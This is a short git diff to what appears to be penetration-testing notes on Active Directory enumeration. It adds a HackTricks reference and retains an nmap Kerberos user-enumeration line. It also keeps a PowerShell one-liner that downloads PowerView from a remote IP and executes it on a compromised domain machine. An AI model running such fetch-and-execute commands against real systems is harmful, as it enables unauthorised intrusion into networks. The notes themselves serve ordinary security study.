@@ -169,12 +169,15 @@ nmap -p 88 --script krb5-enum-users --script-args "krb5-enum-users.realm='spooky
 
 #### PowerView
 
+Reference: https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview
+
+
 * Poverview has a lot of built-in AD functionalities
 * So once a domain machine is compromised, upload and run powerview on it
 
 ```powershell
 
-# download and execute commands
+#  agentless command execution
 
 IEX(New-Object Net.WebClient).downloadString('http://192.168.1.xxx/PowerView.ps1'); Get-NetComputer | select cn;
 
